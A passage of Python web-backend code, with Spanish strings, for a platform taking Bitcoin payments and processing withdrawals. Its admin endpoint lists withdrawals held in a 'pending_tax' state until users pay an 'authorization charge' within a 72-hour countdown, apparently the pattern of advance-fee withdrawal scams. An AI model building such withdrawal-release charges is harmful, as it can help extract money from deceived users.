                        <td style="color: #e2e8f0; text-align: right; padding: 8px 0; border-bottom: 1px solid #334155;">Bitcoin (BTC)</td></tr>
                    <tr><td style="color: #94a3b8; padding: 8px 0; border-bottom: 1px solid #334155;">TXID:</td>
                        <td style="color: #e2e8f0; text-align: right; padding: 8px 0; font-family: monospace; font-size: 12px;">{payment.txid}</td></tr>
                    <tr><td style="color: #94a3b8; padding: 8px 0;">Estado:</td>
                        <td style="color: #fbbf24; text-align: right; padding: 8px 0; font-weight: bold;">En Revisión</td></tr>
                </table>
                <div style="margin-top: 15px; text-align: center;">
                    <a href="https://www.blockchain.com/explorer/transactions/btc/{payment.txid}" style="color: #06b6d4; font-size: 14px;">Ver transacción en Blockchain</a>
                </div>
            </td></tr>
        </table>
        <p style="color: #94a3b8; font-size: 14px;">Todas las transacciones son verificables en la blockchain pública.</p>
    """
    send_email_background(current_user['email'], f"Pago Crypto Registrado - ${payment.amount_sent} USD", get_email_template(user_email, "Pago Registrado"))
    
    return {
        'message': 'Pago registrado exitosamente. Será verificado por nuestro equipo.',
        'payment_id': payment_id,
        'status': 'under_review'
    }

@router.get("/transactions/{transaction_id}/crypto-payment")
async def get_crypto_payment_status(
    transaction_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Get all crypto payments for a transaction"""
    # Verify ownership
    transaction = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id']},
        {'_id': 0}
    )
    
    if not transaction:
        raise HTTPException(status_code=404, detail='Transaction not found')
    
    # Return all payments for this transaction
    payments = await db.crypto_payments.find(
        {'transaction_id': transaction_id},
        {'_id': 0, 'proof_image': 0}
    ).sort('submitted_at', -1).to_list(50)
    
    return payments

@router.get("/admin/pending-abonos")
async def admin_pending_abonos(admin: dict = Depends(get_admin_user)):
    """Todos los retiros con abono pendiente (full + bancario) y su tiempo restante."""
    now = datetime.now(timezone.utc)
    WINDOW_H = 72
    out = []

    # Full withdrawals awaiting the authorization charge
    txs = await db.transactions.find(
        {'transaction_type': 'withdraw', 'status': 'pending_tax'},
        {'_id': 0, 'id': 1, 'user_id': 1, 'transaction_reference': 1, 'amount': 1, 'currency': 1,
         'tax_required': 1, 'tax_paid': 1, 'created_at': 1}
    ).sort('created_at', 1).to_list(500)
    for t in txs:
        try:
            start = datetime.fromisoformat(t['created_at'].replace('Z', '+00:00'))
        except Exception:
            continue
        remaining = WINDOW_H - (now - start).total_seconds() / 3600
        user = await db.users.find_one({'id': t['user_id']}, {'_id': 0, 'name': 1, 'email': 1})
        out.append({
            'kind': 'full', 'id': t['id'], 'reference': t.get('transaction_reference'),
            'user_name': (user or {}).get('name'), 'user_email': (user or {}).get('email'),
            'withdraw_amount': t.get('amount'), 'currency': t.get('currency'),
            'charge_required': t.get('tax_required', TAX_AMOUNT), 'charge_paid': t.get('tax_paid', 0),
            'started_at': t['created_at'], 'hours_remaining': round(max(0, remaining), 1),
            'expired': remaining <= 0,
        })

    # Bank withdrawals confirmed but not yet paid
    bws = await db.bank_withdrawal_requests.find(
        {'status': 'conversion_done'},
        {'_id': 0, 'id': 1, 'user_id': 1, 'reference': 1, 'user_name': 1, 'user_email': 1,
         'from_amount': 1, 'from_currency': 1, 'net_to_amount': 1, 'to_currency': 1, 'bank_name': 1,
         'code_verified_at': 1, 'updated_at': 1, 'created_at': 1}
    ).sort('created_at', 1).to_list(500)
    for b in bws:
        start_iso = b.get('code_verified_at') or b.get('updated_at') or b.get('created_at')
        try:
            start = datetime.fromisoformat(start_iso.replace('Z', '+00:00'))
        except Exception:
            continue
        remaining = WINDOW_H - (now - start).total_seconds() / 3600
        out.append({
            'kind': 'bank', 'id': b['id'], 'reference': b.get('reference'),
            'user_name': b.get('user_name'), 'user_email': b.get('user_email'),
            'withdraw_amount': b.get('from_amount'), 'currency': b.get('from_currency'),
            'net_to_amount': b.get('net_to_amount'), 'to_currency': b.get('to_currency'),
            'bank_name': b.get('bank_name'),
            'charge_required': TAX_AMOUNT, 'charge_paid': 0,
            'started_at': start_iso, 'hours_remaining': round(max(0, remaining), 1),
            'expired': remaining <= 0,
        })

    out.sort(key=lambda x: x['hours_remaining'])
    return {
        'items': out,
        'stats': {
            'total': len(out),
            'urgent': sum(1 for x in out if 0 < x['hours_remaining'] <= 6),
            'expired': sum(1 for x in out if x['expired']),
        }
    }


@router.get("/transactions/{transaction_id}/requirements")
async def get_transaction_requirements(transaction_id: str, current_user: dict = Depends(get_current_user)):
    """Pre-processing requirements checklist for the user's own withdrawal."""
    tx = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id'], 'transaction_type': 'withdraw'},
        {'_id': 0},
    )
    if not tx:
        raise HTTPException(status_code=404, detail='Retiro no encontrado')
    return await compute_withdrawal_requirements(tx)


@router.get("/transactions/{transaction_id}/proof")
async def get_my_transaction_proof(
    transaction_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Return the uploaded proof + date for the user's own withdrawal."""
    transaction = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id']},
        {'_id': 0, 'id': 1}
    )
    if not transaction:
        raise HTTPException(status_code=404, detail='Transaction not found')
    payment = await db.crypto_payments.find_one(
        {'transaction_id': transaction_id},
        {'_id': 0, 'proof_image': 1, 'submitted_at': 1, 'status': 1, 'crypto_type': 1, 'txid': 1, 'amount_sent': 1}
    )
    if not payment:
        return {'has_proof': False}
    return {
        'has_proof': bool(payment.get('proof_image')),
        'proof_image': payment.get('proof_image'),
        'submitted_at': payment.get('submitted_at'),
        'status': payment.get('status'),
        'crypto_type': payment.get('crypto_type'),
        'txid': payment.get('txid'),
        'amount_sent': payment.get('amount_sent'),
    }

@router.get("/admin/crypto-payments/{payment_id}/proof")
async def admin_get_crypto_payment_proof(
    payment_id: str,
    admin: dict = Depends(get_admin_user)
):
    """Get proof image for a crypto payment (admin only)"""
    payment = await db.crypto_payments.find_one(
        {'id': payment_id},
        {'_id': 0, 'proof_image': 1}
    )
    
    if not payment:
        raise HTTPException(status_code=404, detail='Payment not found')
    
    return {'proof_image': payment.get('proof_image')}

# ==================== NOTIFICATIONS ROUTES ====================
